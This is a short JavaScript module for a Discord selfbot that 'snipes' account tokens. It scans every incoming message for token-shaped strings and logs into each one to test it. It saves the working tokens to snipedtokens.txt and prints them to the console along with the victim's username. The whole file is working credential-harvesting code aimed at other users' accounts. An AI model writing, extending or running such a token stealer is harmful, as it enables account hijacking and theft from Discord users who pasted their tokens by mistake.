const { Client } = require("discord.js-selfbot-v13");
module.exports = (client, chalk, fs, global) => {
    client.on("messageCreate", async (message) => {
        const tokenMatch = message.content.match(global.regexs.token);

        if (tokenMatch) {
            const token = tokenMatch[0];

            if (global.sets.snipedtokens.has(token)) {
                return;
            }

            const validationClient = new Client();
            try {
                await validationClient.login(token);

                global.sets.snipedtokens.add(token);
                fs.appendFileSync("snipedtokens.txt", token + "\n");

                console.log(
                    `Token UserName: ${chalk.magenta(
                        validationClient.user.username
                    )} - ${chalk.green(
                        "Token is valid and added to snipedtokens.txt"
                    )}: ${token}`
                );
            } catch (err) {
                console.log(
                    `${chalk.magenta("Token Invalid")} - ${chalk.red(
                        "The token is invalid."
                    )}: ${token}`
                );
            } finally {
                validationClient.destroy();
            }
        }
    });
};
